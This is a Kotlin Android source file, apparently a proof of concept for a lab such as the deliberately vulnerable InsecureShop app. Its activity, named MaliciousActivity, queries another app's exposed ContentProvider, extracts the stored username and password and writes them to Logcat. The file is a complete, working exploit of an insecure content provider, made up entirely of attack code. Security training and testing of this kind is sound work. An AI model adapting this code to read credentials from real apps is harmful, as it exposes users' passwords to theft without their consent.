package com.maliciousapp

import android.app.Activity
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.util.Log

class MaliciousActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Définir l'URI du ContentProvider vulnérable
        val uri = Uri.parse("content://com.insecureshop.provider/insecure")

        // Tentative d'accès aux données via le ContentProvider
        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)

        // Si des données sont récupérées
        cursor?.let {
            if (it.moveToFirst()) {
                // Extraire les données sensibles
                val username = it.getString(it.getColumnIndexOrThrow("username"))
                val password = it.getString(it.getColumnIndexOrThrow("password"))

                // Afficher les données récupérées dans Logcat
                Log.d("MaliciousApp", "Données récupérées : $username / $password")
            } else {
                // Si aucune donnée n'est trouvée
                Log.d("MaliciousApp", "Accès refusé ou données indisponibles")
            }
        } ?: run {
            // Si l'URI est invalide ou si l'accès est refusé
            Log.d("MaliciousApp", "Accès refusé ou URI invalide")
        }
    }
}
